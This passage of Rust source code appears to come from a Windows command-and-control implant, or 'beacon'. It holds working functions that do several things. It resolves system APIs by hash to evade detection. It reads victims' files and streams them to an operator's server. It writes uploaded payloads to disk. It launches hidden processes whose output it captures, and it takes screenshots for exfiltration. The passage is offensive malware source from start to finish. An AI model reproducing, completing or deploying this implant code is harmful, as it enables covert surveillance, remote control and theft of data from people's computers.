        (core::mem::transmute::<*const core::ffi::c_void, unsafe extern "system" fn(isize) -> i32>(
            close as *const core::ffi::c_void,
        ))(dl.handle);
    }
    let mut path = [0u8; 260];
    if c_path(task, &mut path).is_none() {
        error(kernel32, id, results);
        return;
    }
    let handle = create(
        path.as_ptr(),
        0x8000_0000,               // GENERIC_READ
        0x0000_0001 | 0x0000_0002, // FILE_SHARE_READ | FILE_SHARE_WRITE
        core::ptr::null(),
        3, // OPEN_EXISTING
        0,
        core::ptr::null(),
    );
    if handle == -1 {
        error(kernel32, id, results);
        return;
    }
    // Size via the file pointer end (SetFilePointer(-1...) = EOF).
    let tell = peb::find_export(kernel32, fnv1a64(b"SetFilePointer"));
    let mut size = 0u64;
    if !tell.is_null() {
        let tell = core::mem::transmute::<
            *const core::ffi::c_void,
            unsafe extern "system" fn(isize, i32, *mut i32, u32) -> u32,
        >(tell as *const core::ffi::c_void);
        let mut high: i32 = 0;
        let _ = tell(handle, 0, &mut high, 2); // FILE_END
        size = ((high as i64 as u64) << 32).wrapping_add(0);
        let _ = tell(handle, 0, core::ptr::null_mut(), 0); // rewind (FILE_BEGIN)
    }
    // Name: the task path (bounded copy for the START record).
    let path = task.path();
    let mut name = [0u8; 64];
    let nlen = path.len().min(64);
    let mut i = 0;
    while i < nlen {
        name[i] = path[i];
        i += 1;
    }
    instance.download = Some(DownloadState {
        task_id: id,
        file_id: instance.rng.next_u64() as u32,
        handle,
        size,
        name,
        name_len: nlen as u16,
        started: false,
    });
}

/// Stream one download chunk (or the START/FINISH records) into the
/// cycle body. Called at POST time, before the results frame is closed.
///
/// # Safety
///
/// Beacon thread; instance stored in the TEB.
pub unsafe fn download_tick(instance: &mut Instance, w: &mut Writer, chunk: &mut [u8]) {
    let kernel32 = instance.kernel32;
    let Some(dl) = instance.download.as_mut() else {
        return;
    };
    if !dl.started {
        let name = &dl.name[..dl.name_len as usize];
        if !transport::push_download_start(w, dl.task_id, dl.file_id, dl.size, name) {
            return;
        }
        dl.started = true;
    }
    let read_ptr = peb::find_export(kernel32, H_READ_FILE);
    let close = peb::find_export(kernel32, H_CLOSE_HANDLE);
    if read_ptr.is_null() || close.is_null() {
        return;
    }
    let read = core::mem::transmute::<
        *const core::ffi::c_void,
        unsafe extern "system" fn(isize, *mut u8, u32, *mut u32, *const c_void) -> i32,
    >(read_ptr as *const core::ffi::c_void);
    let close = core::mem::transmute::<
        *const core::ffi::c_void,
        unsafe extern "system" fn(isize) -> i32,
    >(close as *const core::ffi::c_void);
    let want = chunk.len().min(DOWNLOAD_CHUNK);
    let mut got: u32 = 0;
    let handle = dl.handle;
    if read(
        handle,
        chunk.as_mut_ptr(),
        want as u32,
        &mut got,
        core::ptr::null(),
    ) == 0
    {
        // Read failure: close and report — the server marks the task
        // running; the FINISH never comes (the operator cancels).
        close(handle);
        instance.download = None;
        return;
    }
    if got == 0 {
        // EOF: FINISH and done.
        let _ = transport::push_download_finish(w, dl.task_id, dl.file_id);
        close(handle);
        instance.download = None;
        return;
    }
    let _ = transport::push_download_continue(w, dl.task_id, dl.file_id, &chunk[..got as usize]);
}

unsafe fn exfil(instance: &mut Instance, action: u8, file_id: u32, id: u32, results: &mut Writer) {
    let kernel32 = instance.kernel32;
    let close = peb::find_export(kernel32, H_CLOSE_HANDLE);
    if action == transport::EXFIL_STOPPED || action == transport::EXFIL_CANCELED {
        let matches = match instance.download.as_ref() {
            Some(dl) => dl.file_id == file_id,
            None => false,
        };
        if matches {
            if let Some(dl) = instance.download.take() {
                if !close.is_null() {
                    (core::mem::transmute::<
                        *const core::ffi::c_void,
                        unsafe extern "system" fn(isize) -> i32,
                    >(close as *const core::ffi::c_void))(dl.handle);
                }
            }
        }
    }
    // Always ack with the requested state — the server renders the
    // stop/resume/cancel message. RESUME is a no-op: the beacon streams
    // continuously and never pauses on its own.
    let _ = transport::push_exfil_result(results, id, file_id, action);
}

/// Accumulate a SAVEMEMORY chunk into the upload buffer (heap). No ack:
/// the server has no ProcessData case for it.
///
/// # Safety
///
/// Beacon thread; heap resolved on the instance.
pub unsafe fn save_memory(instance: &mut Instance, memory_id: u32, expected: usize, chunk: &[u8]) {
    let Some(heap) = instance.heap else {
        return;
    };
    if expected > UPLOAD_MAX {
        return;
    }
    match instance.upload.as_mut() {
        None => {
            let buf = (heap.alloc)(heap.handle, 0x08, expected); // HEAP_ZERO_MEMORY
            if buf.is_null() {
                return;
            }
            instance.upload = Some(UploadState {
                memory_id,
                expected,
                buf: buf as *mut u8,
                cap: expected,
                received: 0,
            });
        }
        Some(up) => {
            if up.memory_id != memory_id || up.expected != expected {
                // A different upload replaces the previous one.
                (heap.free)(heap.handle, 0, up.buf as *mut c_void);
                let buf = (heap.alloc)(heap.handle, 0x08, expected);
                if buf.is_null() {
                    instance.upload = None;
                    return;
                }
                up.memory_id = memory_id;
                up.expected = expected;
                up.buf = buf as *mut u8;
                up.cap = expected;
                up.received = 0;
            }
        }
    }
    let Some(up) = instance.upload.as_mut() else {
        return;
    };
    if up.received + chunk.len() > up.cap {
        return; // overflow of the announced size: drop (never happens
                // with a conforming server)
    }
    let mut i = 0;
    while i < chunk.len() {
        *up.buf.add(up.received + i) = chunk[i];
        i += 1;
    }
    up.received += chunk.len();
}

unsafe fn upload_write(instance: &mut Instance, task: &Task, id: u32, results: &mut Writer) {
    let kernel32 = instance.kernel32;
    let memory_id = match task {
        Task::Upload { memory_id, .. } => *memory_id,
        _ => return,
    };
    let up = instance.upload.take();
    let Some(up) = up else {
        error(kernel32, id, results);
        return;
    };
    if up.memory_id != memory_id {
        error(kernel32, id, results);
    } else {
        let create = peb::find_export(kernel32, H_CREATE_FILE_A);
        let write = peb::find_export(kernel32, H_WRITE_FILE);
        let close = peb::find_export(kernel32, H_CLOSE_HANDLE);
        if create.is_null() || write.is_null() || close.is_null() {
            error(kernel32, id, results);
        } else {
            let create = core::mem::transmute::<
                *const core::ffi::c_void,
                unsafe extern "system" fn(
                    *const u8,
                    u32,
                    u32,
                    *const c_void,
                    u32,
                    u32,
                    *const c_void,
                ) -> isize,
            >(create as *const core::ffi::c_void);
            let write = core::mem::transmute::<
                *const core::ffi::c_void,
                unsafe extern "system" fn(isize, *const u8, u32, *mut u32, *const c_void) -> i32,
            >(write as *const core::ffi::c_void);
            let close = core::mem::transmute::<
                *const core::ffi::c_void,
                unsafe extern "system" fn(isize) -> i32,
            >(close as *const core::ffi::c_void);
            let mut path = [0u8; 260];
            if c_path(task, &mut path).is_none() {
                error(kernel32, id, results);
            } else {
                let handle = create(
                    path.as_ptr(),
                    0x4000_0000, // GENERIC_WRITE
                    0,
                    core::ptr::null(),
                    2, // CREATE_ALWAYS
                    0,
                    core::ptr::null(),
                );
                if handle == -1 {
                    error(kernel32, id, results);
                } else {
                    let mut written: u32 = 0;
                    let mut ok = write(
                        handle,
                        up.buf as *const u8,
                        up.received as u32,
                        &mut written,
                        core::ptr::null(),
                    );
                    // Chunks beyond 4 GB would wrap u32 — the cap makes
                    // this unreachable; kept for honesty.
                    if ok != 0 && (written as usize) < up.received {
                        ok = 0;
                    }
                    close(handle);
                    if ok == 0 {
                        error(kernel32, id, results);
                    } else {
                        let _ = transport::push_upload_result(results, id);
                    }
                }
            }
        }
    }
    if let Some(heap) = instance.heap {
        (heap.free)(heap.handle, 0, up.buf as *mut c_void);
    }
}

unsafe fn error(kernel32: *mut c_void, id: u32, results: &mut Writer) {
    let p = peb::find_export(kernel32, H_GET_LAST_ERROR);
    let code = if p.is_null() {
        0
    } else {
        (core::mem::transmute::<*const core::ffi::c_void, unsafe extern "system" fn() -> u32>(
            p as *const core::ffi::c_void,
        ))()
    };
    let _ = transport::push_error_result(results, id, code);
}

// --- ps run + jobs (port of the native Commander.cpp CmdPsRun and
// JobsController.cpp ProcessJobs; MVP without the stored-token path) -------

const H_CREATE_PIPE: u64 = fnv1a64(b"CreatePipe");
const H_CREATE_PROCESS_A: u64 = fnv1a64(b"CreateProcessA");
const H_GET_EXIT_CODE_PROCESS: u64 = fnv1a64(b"GetExitCodeProcess");
const H_PEEK_NAMED_PIPE: u64 = fnv1a64(b"PeekNamedPipe");

/// STARTUPINFOA (x64, 8-byte aligned): cb +0x00, lpReserved +0x08,
/// lpDesktop +0x10, lpTitle +0x18, dwX..dwFillAttribute +0x20..0x38,
/// dwFlags +0x3C, wShowWindow +0x40, cbReserved2 +0x42, (pad),
/// lpReserved2 +0x48, hStdInput +0x50, hStdOutput +0x58, hStdError +0x60;
/// sizeof = 0x68 (104). PROCESS_INFORMATION: hProcess +0, hThread +8,
/// dwProcessId +16 — size 24. The iteration-16 bug: the offsets were
/// computed on a packed layout, the pipe handles landed in dwXSize /
/// dwYCountChars - the child never wrote to the pipe.
const SI_A_SIZE: usize = 0x68;
const SI_A_OFF_FLAGS: usize = 0x3C;
const SI_A_OFF_SHOW: usize = 0x40;
const SI_A_OFF_STDOUT: usize = 0x58;
const SI_A_OFF_STDERR: usize = 0x60;
const PI_SIZE: usize = 24;
const PI_OFF_PID: usize = 16;
const STARTF_USESTDHANDLES: u32 = 0x100;
const STARTF_USESHOWWINDOW: u32 = 0x1;
const SW_HIDE: u16 = 0;
const CREATE_SUSPENDED: u32 = 0x4;
const CREATE_NO_WINDOW: u32 = 0x0800_0000;
const STILL_ACTIVE: u32 = 259;
/// SECURITY_ATTRIBUTES: nLength +0, bInheritHandle +4 (BOOL).
// SECURITY_ATTRIBUTES (x64): nLength +0x00 (u32), lpSecurityDescriptor
// +0x08 (u64), bInheritHandle +0x10 (u32) - the write end must be
// inheritable or the child never gets the pipe.
const SA_OFF_INHERIT: usize = 0x10;

/// `ps run`: create the (optional) stdout pipe, start the program hidden
/// with stdio redirection, register the job, reply with the pid.
///
/// # Safety
///
/// Beacon thread; kernel32 resolved on the instance.
pub unsafe fn ps_run(instance: &mut Instance, task: &Task, id: u32, results: &mut Writer) {
    let Task::PsRun {
        output,
        prog_state,
        args_len,
        args,
    } = task
    else {
        return;
    };
    let kernel32 = instance.kernel32;
    let close = peb::find_export(kernel32, H_CLOSE_HANDLE);

    // Command line: NUL-terminated copy (manual loop — the memcpy rule).
    let mut cmdline = [0u8; transport::PATH_CAP + 1];
    let n = (*args_len as usize).min(transport::PATH_CAP);
    let mut ci = 0usize;
    while ci < n {
        cmdline[ci] = args[ci];
        ci += 1;
    }

    // Stdout pipe (inheritable write end).
    let mut pipe_read: isize = 0;
    let mut pipe_write: isize = 0;
    if *output {
        let create_pipe = peb::find_export(kernel32, H_CREATE_PIPE);
        if create_pipe.is_null() {
            return;
        }
        let create_pipe = core::mem::transmute::<
            *const core::ffi::c_void,
            unsafe extern "system" fn(*mut isize, *mut isize, *mut u8, u32) -> i32,
        >(create_pipe as *const core::ffi::c_void);
        let mut sa = [0u8; 24];
        sa[..4].copy_from_slice(&24u32.to_le_bytes());
        sa[SA_OFF_INHERIT..SA_OFF_INHERIT + 4].copy_from_slice(&1i32.to_le_bytes());
        if create_pipe(&mut pipe_read, &mut pipe_write, sa.as_mut_ptr(), 0) == 0 {
            return;
        }
    }

    let mut si = [0u8; SI_A_SIZE];
    si[..4].copy_from_slice(&(SI_A_SIZE as u32).to_le_bytes());
    let flags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si[SI_A_OFF_FLAGS..SI_A_OFF_FLAGS + 4].copy_from_slice(&flags.to_le_bytes());
    si[SI_A_OFF_SHOW..SI_A_OFF_SHOW + 2].copy_from_slice(&SW_HIDE.to_le_bytes());
    if *output {
        si[SI_A_OFF_STDOUT..SI_A_OFF_STDOUT + 8]
            .copy_from_slice(&(pipe_write as u64).to_le_bytes());
        si[SI_A_OFF_STDERR..SI_A_OFF_STDERR + 8]
            .copy_from_slice(&(pipe_write as u64).to_le_bytes());
    }
    let mut pi = [0u8; PI_SIZE];

    let create = peb::find_export(kernel32, H_CREATE_PROCESS_A);
    if create.is_null() {
        if *output && !close.is_null() {
            (core::mem::transmute::<
                *const core::ffi::c_void,
                unsafe extern "system" fn(isize) -> i32,
            >(close as *const core::ffi::c_void))(pipe_read);
            (core::mem::transmute::<
                *const core::ffi::c_void,
                unsafe extern "system" fn(isize) -> i32,
            >(close as *const core::ffi::c_void))(pipe_write);
        }
        return;
    }
    let create = core::mem::transmute::<
        *const core::ffi::c_void,
        unsafe extern "system" fn(
            *const u8,
            *mut u8,
            *const core::ffi::c_void,
            *const core::ffi::c_void,
            i32,
            u32,
            *const core::ffi::c_void,
            *const u8,
            *mut u8,
            *mut u8,
        ) -> i32,
    >(create as *const core::ffi::c_void);

    let creation = CREATE_NO_WINDOW | (*prog_state & CREATE_SUSPENDED);
    let ok = create(
        core::ptr::null(),
        cmdline.as_mut_ptr(),
        core::ptr::null(),
        core::ptr::null(),
        i32::from(*output),
        creation,
        core::ptr::null(),
        core::ptr::null(),
        si.as_mut_ptr(),
        pi.as_mut_ptr(),
    );

    // The write end must close in the parent whatever happens next (the
    // child owns its inherited copy).
    if *output && !close.is_null() {
        (core::mem::transmute::<*const core::ffi::c_void, unsafe extern "system" fn(isize) -> i32>(
            close as *const core::ffi::c_void,
        ))(pipe_write);
    }

    if ok == 0 {
        // COMMAND_ERROR record: the server renders `Error [code]`.
        let error = peb::find_export(kernel32, H_GET_LAST_ERROR);
        let code = if error.is_null() {
            0
        } else {
            (core::mem::transmute::<*const core::ffi::c_void, unsafe extern "system" fn() -> i32>(
                error as *const core::ffi::c_void,
            ))() as u32
        };
        let _ = transport::push_error_result(results, id, code);
        if *output && !close.is_null() {
            (core::mem::transmute::<
                *const core::ffi::c_void,
                unsafe extern "system" fn(isize) -> i32,
            >(close as *const core::ffi::c_void))(pipe_read);
        }
        return;
    }

    let pid = u32::from_le_bytes([
        pi[PI_OFF_PID],
        pi[PI_OFF_PID + 1],
        pi[PI_OFF_PID + 2],
        pi[PI_OFF_PID + 3],
    ]);
    let mut handle_bytes = [0u8; 8];
    handle_bytes.copy_from_slice(&pi[..8]);
    let handle = isize::from_le_bytes(handle_bytes);

    // Register the job (drop the oldest slot when full — the operator
    // rarely runs more than MAX_JOBS at once).
    if instance.jobs_len >= MAX_JOBS {
        instance.jobs_len = MAX_JOBS - 1;
    }
    instance.jobs[instance.jobs_len] = Job {
        id,
        handle,
        pid,
        pipe_read: if *output { pipe_read } else { 0 },
        killed: false,
    };
    instance.jobs_len += 1;

    let _ = transport::push_ps_run_result(results, id, pid, *output, &cmdline[..n]);
}

/// `jobs list`: one line per live job.
///
/// # Safety
///
/// Beacon thread.
pub unsafe fn jobs_list(instance: &mut Instance, id: u32, results: &mut Writer) {
    let _ = transport::push_jobs_list_header(results, id, instance.jobs_len as u32);
    let mut i = 0usize;
    while i < instance.jobs_len {
        let j = instance.jobs[i];
        let _ = transport::push_jobs_list_entry(results, j.id, transport::JOB_TYPE_PROCESS, j.pid);
        i += 1;
    }
}

/// `jobs kill`: mark the job killed (the drain reaps it next cycle,
/// exactly like the native).
///
/// # Safety
///
/// Beacon thread.
pub unsafe fn jobs_kill(instance: &mut Instance, job_id: u32, id: u32, results: &mut Writer) {
    let mut found = false;
    let mut i = 0usize;
    while i < instance.jobs_len {
        if instance.jobs[i].id == job_id {
            instance.jobs[i].killed = true;
            found = true;
        }
        i += 1;
    }
    let _ = transport::push_jobs_kill_result(results, id, found, job_id);
}

/// Per-cycle job drain (port of JobsController::ProcessJobs): read the
/// pending stdout, detect the exit, emit the COMMAND_JOB records, reap
/// finished jobs.
///
/// # Safety
///
/// Beacon thread; kernel32 resolved on the instance.
pub unsafe fn jobs_tick(instance: &mut Instance, results: &mut Writer) {
    if instance.jobs_len == 0 {
        return;
    }
    let kernel32 = instance.kernel32;
    let close = peb::find_export(kernel32, H_CLOSE_HANDLE);
    let terminate = peb::find_export(kernel32, H_TERMINATE_PROCESS);
    let get_exit_ptr = peb::find_export(kernel32, H_GET_EXIT_CODE_PROCESS);
    if get_exit_ptr.is_null() {
        return;
    }
    let get_exit: unsafe extern "system" fn(isize, *mut u32) -> i32 =
        core::mem::transmute::<
            *const core::ffi::c_void,
            unsafe extern "system" fn(isize, *mut u32) -> i32,
        >(get_exit_ptr as *const core::ffi::c_void);
    type PeekFn =
        unsafe extern "system" fn(isize, *mut u8, u32, *mut u32, *mut u32, *mut u8) -> i32;
    type ReadFn =
        unsafe extern "system" fn(isize, *mut u8, u32, *mut u32, *const core::ffi::c_void) -> i32;
    let peek_ptr = peb::find_export(kernel32, H_PEEK_NAMED_PIPE);
    let read_ptr = peb::find_export(kernel32, H_READ_FILE);
    let peek: Option<PeekFn> = if peek_ptr.is_null() {
        None
    } else {
        Some(core::mem::transmute::<*const core::ffi::c_void, PeekFn>(
            peek_ptr as *const core::ffi::c_void,
        ))
    };
    let read: Option<ReadFn> = if read_ptr.is_null() {
        None
    } else {
        Some(core::mem::transmute::<*const core::ffi::c_void, ReadFn>(
            read_ptr as *const core::ffi::c_void,
        ))
    };

    let mut scratch = [0u8; JOB_DRAIN_CAP];
    let mut i = 0usize;
    while i < instance.jobs_len {
        let job = instance.jobs[i];

        // 1. stdout: peek then read the capped slice.
        if job.pipe_read != 0 {
            crate::runtime::debug::log(&*(instance as *const Instance), b"jt: drain\n");
            if let (Some(peek), Some(read)) = (peek, read) {
                let mut available: u32 = 0;
                let peeked = peek(
                    job.pipe_read,
                    core::ptr::null_mut(),
                    0,
                    core::ptr::null_mut(),
                    &mut available,
                    core::ptr::null_mut(),
                );
                let mut line = [0u8; 17];
                line[..11].copy_from_slice(b"jt: peeked ");
                line[11..15].copy_from_slice(&available.to_le_bytes());
                line[15] = b'\n';
                crate::runtime::debug::log(&*(instance as *const Instance), &line[..16]);
                if peeked != 0 && available > 0 {
                    crate::runtime::debug::log(&*(instance as *const Instance), b"jt: avail\n");
                    let want = (available as usize).min(JOB_DRAIN_CAP);
                    let mut got: u32 = 0;
                    let readed = read(
                        job.pipe_read,
                        scratch.as_mut_ptr(),
                        want as u32,
                        &mut got,
                        core::ptr::null(),
                    );
                    if readed != 0 && got > 0 {
                        crate::runtime::debug::log(&*(instance as *const Instance), b"jt: read\n");
                        // Atomic record: only when the whole record fits.
                        let need = 10 + 4 + got as usize + 4;
                        if results.remaining() >= need {
                            crate::runtime::debug::log(
                                &*(instance as *const Instance),
                                b"jt: push\n",
                            );
                            let _ = transport::push_job_output(
                                results,
                                job.id,
                                transport::JOB_TYPE_PROCESS,
                                transport::JOB_STATE_RUNNING,
                                &scratch[..got as usize],
                            );
                        }
                    }
                }
            }
        }

        crate::runtime::debug::log(&*(instance as *const Instance), b"jt: exit?\n");
        // 2. exit detection (a killed job is reaped without waiting).
        let mut done = job.killed;
        let mut state = transport::JOB_STATE_KILLED;
        if !done {
            let mut code: u32 = 0;
            if get_exit(job.handle, &mut code) != 0 && code != STILL_ACTIVE {
                done = true;
                state = transport::JOB_STATE_FINISHED;
            }
        }

        if done {
            if !terminate.is_null() {
                (core::mem::transmute::<
                    *const core::ffi::c_void,
                    unsafe extern "system" fn(isize, u32) -> i32,
                >(terminate as *const core::ffi::c_void))(job.handle, 0);
            }
            if !close.is_null() {
                let close_fn = core::mem::transmute::<
                    *const core::ffi::c_void,
                    unsafe extern "system" fn(isize) -> i32,
                >(close as *const core::ffi::c_void);
                close_fn(job.handle);
                if job.pipe_read != 0 {
                    close_fn(job.pipe_read);
                }
            }
            if results.remaining() >= 10 {
                let _ =
                    transport::push_job_end(results, job.id, transport::JOB_TYPE_PROCESS, state);
            }
            // Remove: shift the tail left.
            let mut j = i;
            while j + 1 < instance.jobs_len {
                instance.jobs[j] = instance.jobs[j + 1];
                j += 1;
            }
            instance.jobs_len -= 1;
        } else {
            i += 1;
        }
    }
}

// --- screenshot (port of the native SptCmdScreenshot: GDI capture by hash,
// BMP 24bpp with an 8bpp grayscale fallback for oversized screens; the
// capture lands in a heap buffer and streams across cycles like a
// download — the POST body frame is 0x12000, a full-screen BMP is ~7 MiB) --

const H_USER32: u64 = specter_core::fnv::fnv1a64_wide_ascii_ci("user32.dll");
const H_GDI32: u64 = specter_core::fnv::fnv1a64_wide_ascii_ci("gdi32.dll");
const USER32_DLL: &[u8] = b"user32.dll\0";
const GDI32_DLL: &[u8] = b"gdi32.dll\0";
const H_LOAD_LIBRARY_A: u64 = fnv1a64(b"LoadLibraryA");
const H_GET_SYSTEM_METRICS: u64 = fnv1a64(b"GetSystemMetrics");
const H_GET_DC: u64 = fnv1a64(b"GetDC");
const H_RELEASE_DC: u64 = fnv1a64(b"ReleaseDC");
const H_CREATE_COMPATIBLE_DC: u64 = fnv1a64(b"CreateCompatibleDC");
const H_CREATE_COMPATIBLE_BITMAP: u64 = fnv1a64(b"CreateCompatibleBitmap");
const H_SELECT_OBJECT: u64 = fnv1a64(b"SelectObject");
const H_BIT_BLT: u64 = fnv1a64(b"BitBlt");
const H_GET_DIBITS: u64 = fnv1a64(b"GetDIBits");
const H_DELETE_OBJECT: u64 = fnv1a64(b"DeleteObject");
const H_DELETE_DC: u64 = fnv1a64(b"DeleteDC");

const SM_CXSCREEN: i32 = 0;
const SM_CYSCREEN: i32 = 1;
const SRCCOPY: u32 = 0x00CC_0020;
/// Capture size cap (24bpp 1920x1200 = 6.6 MiB fits; bigger screens fall
/// back to 8bpp grayscale — the native tiering, against the heap budget).
const SHOT_CAP: usize = 8 * 1024 * 1024;
/// Bytes streamed per cycle (same cadence as a download chunk; the
/// START/CONTINUE records fit the 0x12000 body frame with the results
/// queue).
const SHOT_CHUNK: usize = 48 * 1024;

/// One active screenshot stream: the captured BMP (heap) and the cursor.
pub struct ShotState {
    pub task_id: u32,
    pub buf: *mut u8,
    pub len: usize,
    pub cursor: usize,
    pub started: bool,
}

/// Resolve a module: PEB first, `LoadLibraryA` if absent (winhttp pattern).
unsafe fn load_module(
    peb: *const specter_core::peb::Peb,
    kernel32: *mut c_void,
    hash: u64,
    name: &[u8],
) -> *mut c_void {
    let mut module = peb::find_module(peb, hash);
    if module.is_null() && !kernel32.is_null() {
        let load = peb::find_export(kernel32, H_LOAD_LIBRARY_A);
        if !load.is_null() {
            let load = core::mem::transmute::<
                *const core::ffi::c_void,
                unsafe extern "system" fn(*const u8) -> *mut c_void,
            >(load as *const core::ffi::c_void);
            module = load(name.as_ptr());
        }
    }
    module
}

/// `screenshot`: capture the screen into a heap BMP and arm the stream.
/// The START record lands on the first tick (download pattern).
///
/// # Safety
///
/// Beacon thread; kernel32 and the PEB resolved at bootstrap.
pub unsafe fn screenshot_start(instance: &mut Instance, id: u32, results: &mut Writer) {
    let kernel32 = instance.kernel32;
    if instance.screenshot.is_some() {
        // One stream at a time (the queue drains 48 KiB per cycle anyway).
        error(kernel32, id, results);
        return;
    }
    let Some(heap) = instance.heap else {
        error(kernel32, id, results);
        return;
    };

    let peb = crate::runtime::bootstrap::get_peb() as *const specter_core::peb::Peb;
    let user32 = load_module(peb, kernel32, H_USER32, USER32_DLL);
    if user32.is_null() {
        error(kernel32, id, results);
        return;
    }
    // user32 links against gdi32: the LoadLibrary of user32 maps it, but a
    // console host may predate that - resolve explicitly.
    let gdi32 = load_module(peb, kernel32, H_GDI32, GDI32_DLL);
    if gdi32.is_null() {
        error(kernel32, id, results);
        return;
    }

    let metrics = peb::find_export(user32, H_GET_SYSTEM_METRICS);
    let get_dc = peb::find_export(user32, H_GET_DC);
    let release_dc = peb::find_export(user32, H_RELEASE_DC);
    let compat_dc = peb::find_export(gdi32, H_CREATE_COMPATIBLE_DC);
    let compat_bmp = peb::find_export(gdi32, H_CREATE_COMPATIBLE_BITMAP);
    let select_obj = peb::find_export(gdi32, H_SELECT_OBJECT);
    let bit_blt = peb::find_export(gdi32, H_BIT_BLT);
    let get_dibits = peb::find_export(gdi32, H_GET_DIBITS);
    let delete_obj = peb::find_export(gdi32, H_DELETE_OBJECT);
    let delete_dc = peb::find_export(gdi32, H_DELETE_DC);
    if metrics.is_null()
        || get_dc.is_null()
        || release_dc.is_null()
        || compat_dc.is_null()
        || compat_bmp.is_null()
        || select_obj.is_null()
        || bit_blt.is_null()
        || get_dibits.is_null()
        || delete_obj.is_null()
        || delete_dc.is_null()
    {
        error(kernel32, id, results);
        return;
    }

    let metrics = core::mem::transmute::<
        *const core::ffi::c_void,
        unsafe extern "system" fn(i32) -> i32,
    >(metrics as *const core::ffi::c_void);
    let get_dc = core::mem::transmute::<
        *const core::ffi::c_void,
        unsafe extern "system" fn(*const c_void) -> *mut c_void,
    >(get_dc as *const core::ffi::c_void);
    let release_dc = core::mem::transmute::<
        *const core::ffi::c_void,
        unsafe extern "system" fn(*const c_void, *mut c_void) -> i32,
    >(release_dc as *const core::ffi::c_void);
    let compat_dc = core::mem::transmute::<
        *const core::ffi::c_void,
        unsafe extern "system" fn(*mut c_void) -> *mut c_void,
    >(compat_dc as *const core::ffi::c_void);
    let compat_bmp = core::mem::transmute::<
        *const core::ffi::c_void,
        unsafe extern "system" fn(*mut c_void, i32, i32) -> *mut c_void,
    >(compat_bmp as *const core::ffi::c_void);
    let select_obj = core::mem::transmute::<
        *const core::ffi::c_void,
        unsafe extern "system" fn(*mut c_void, *mut c_void) -> *mut c_void,
    >(select_obj as *const core::ffi::c_void);
    let bit_blt = core::mem::transmute::<
        *const core::ffi::c_void,
        unsafe extern "system" fn(
            *mut c_void,
            i32,
            i32,
            i32,
            i32,
            *mut c_void,
            i32,
            i32,
            u32,
        ) -> i32,
    >(bit_blt as *const core::ffi::c_void);
    let get_dibits = core::mem::transmute::<
        *const core::ffi::c_void,
        unsafe extern "system" fn(*mut c_void, *mut c_void, u32, u32, *mut u8, *mut u8, u32) -> i32,
    >(get_dibits as *const core::ffi::c_void);
    let delete_obj = core::mem::transmute::<
        *const core::ffi::c_void,
        unsafe extern "system" fn(*mut c_void) -> i32,
    >(delete_obj as *const core::ffi::c_void);
    let delete_dc = core::mem::transmute::<
        *const core::ffi::c_void,
        unsafe extern "system" fn(*mut c_void) -> i32,
    >(delete_dc as *const core::ffi::c_void);

    let cx = metrics(SM_CXSCREEN);
    let cy = metrics(SM_CYSCREEN);
    if cx <= 0 || cy <= 0 {
        error(kernel32, id, results);
        return;
    }
    let cxu = cx as usize;
    let cyu = cy as usize;

    let hdc_screen = get_dc(core::ptr::null());
    if hdc_screen.is_null() {
        error(kernel32, id, results);
        return;
    }
    let hdc_mem = compat_dc(hdc_screen);
    let bmp = compat_bmp(hdc_screen, cx, cy);
    let old = select_obj(hdc_mem, bmp);
    bit_blt(hdc_mem, 0, 0, cx, cy, hdc_screen, 0, 0, SRCCOPY);

    // Bit-depth tiering (native): 24bpp if the pixels fit the cap, 8bpp
    // grayscale (palette) otherwise.
    let row24 = (cxu * 3 + 3) & !3;
    let size24 = row24 * cyu;
    let use8 = 54 + size24 > SHOT_CAP;
    let (hdr_size, img_size, bpp) = if use8 {
        let row8 = (cxu + 3) & !3;
        let size8 = 54 + 1024 + row8 * cyu;
        if size8 > SHOT_CAP {
            select_obj(hdc_mem, old);
            delete_obj(bmp);
            delete_dc(hdc_mem);
            release_dc(core::ptr::null(), hdc_screen);
            error(kernel32, id, results);
            return;
        }
        (54 + 1024, row8 * cyu, 8u16)
    } else {
        (54, size24, 24u16)
    };
    let total = hdr_size + img_size;

    let buf = heap.allocate(total);
    if buf.is_null() {
        select_obj(hdc_mem, old);
        delete_obj(bmp);
        delete_dc(hdc_mem);
        release_dc(core::ptr::null(), hdc_screen);
        error(kernel32, id, results);
        return;
    }

    // BITMAPFILEHEADER (14 bytes): 'BM', total size, reserved, pixel offset.
    *buf.add(0) = b'B';
    *buf.add(1) = b'M';
    let mut le = (total as u32).to_le_bytes();
    let mut i = 0;
    while i < 4 {
        *buf.add(2 + i) = le[i];
        i += 1;
    }
    le = (hdr_size as u32).to_le_bytes();
    let mut i = 0;
    while i < 4 {
        *buf.add(10 + i) = le[i];
        i += 1;
    }

    // BITMAPINFOHEADER (40 bytes, LE): top-down (negative height).
    let mut bi = [0u8; 40];
    bi[0] = 40;
    le = (cx as u32).to_le_bytes();
    bi[4] = le[0];
    bi[5] = le[1];
    bi[6] = le[2];
    bi[7] = le[3];
    le = ((-cy) as u32).to_le_bytes();
    bi[8] = le[0];
    bi[9] = le[1];
    bi[10] = le[2];
    bi[11] = le[3];
    bi[12] = 1; // biPlanes
    bi[14] = (bpp & 0xff) as u8;
    bi[15] = (bpp >> 8) as u8;
    le = (img_size as u32).to_le_bytes();
    bi[20] = le[0];
    bi[21] = le[1];
    bi[22] = le[2];
    bi[23] = le[3];
    if use8 {
        le = 256u32.to_le_bytes();
        bi[32] = le[0];
        bi[33] = le[1];
        bi[34] = le[2];
        bi[35] = le[3];
        bi[36] = le[0];
        bi[37] = le[1];
        bi[38] = le[2];
        bi[39] = le[3];
    }
    let mut i = 0;
    while i < 40 {
        *buf.add(14 + i) = bi[i];
        i += 1;
    }
    if use8 {
        // Grayscale palette: [b, g, r, 0] = [i, i, i, 0].
        let mut i = 0;
        while i < 256 {
            *buf.add(54 + i * 4) = i as u8;
            *buf.add(54 + i * 4 + 1) = i as u8;
            *buf.add(54 + i * 4 + 2) = i as u8;
            *buf.add(54 + i * 4 + 3) = 0;
            i += 1;
        }
    }

    // GetDIBits wants its own BITMAPINFO (header [+ palette]) and writes
    // the pixels straight into the heap buffer, past the file headers.
    let mut bmi = [0u8; 40 + 1024];
    let mut i = 0;
    while i < 40 {
        bmi[i] = bi[i];
        i += 1;
    }
    if use8 {
        let mut i = 0;
        while i < 256 {
            bmi[40 + i * 4] = i as u8;
            bmi[40 + i * 4 + 1] = i as u8;
            bmi[40 + i * 4 + 2] = i as u8;
            bmi[40 + i * 4 + 3] = 0;
            i += 1;
        }
    }
    let scanlines = get_dibits(
        hdc_mem,
        bmp,
        0,
        cy as u32,
        buf.add(hdr_size),
